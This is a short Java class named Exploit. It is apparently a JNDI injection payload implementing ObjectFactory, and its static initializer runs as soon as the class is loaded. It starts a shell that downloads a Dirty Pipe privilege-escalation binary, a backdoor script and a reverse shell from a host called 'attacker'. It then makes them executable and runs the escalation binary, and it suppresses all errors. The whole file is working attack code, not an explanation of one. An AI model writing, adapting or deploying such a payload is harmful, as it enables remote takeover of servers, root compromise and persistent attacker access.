import javax.naming.Name;
import javax.naming.Context;
import java.util.Hashtable;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.BufferedReader;
import javax.naming.spi.ObjectFactory;

public class Exploit implements ObjectFactory{
    static {
	String[] cmd = {"/bin/sh",
			"-c",
			"curl -s -o /tmp/dirtypipe http://attacker:8000/dirtypipe && " +
			"curl -s -o /tmp/backdoor.sh http://attacker:8000/backdoor.sh && " +
			"curl -s -o /tmp/rshell http://attacker:8000/rshell && " +
			"chmod +x /tmp/rshell && " +
			"chmod +x /tmp/dirtypipe && " +
			"/tmp/dirtypipe"};
        try {
			Process p = Runtime.getRuntime().exec(cmd);
			//BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
			//String line;
			//while ((line = reader.readLine()) != null) {
			//	System.out.println(line);
			//}

			// Leggi stderr
			//BufferedReader errReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
			//while ((line = errReader.readLine()) != null) {
			//	System.err.println(line);
			//}
        } catch (Exception e) {}
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        return null;
    }
}
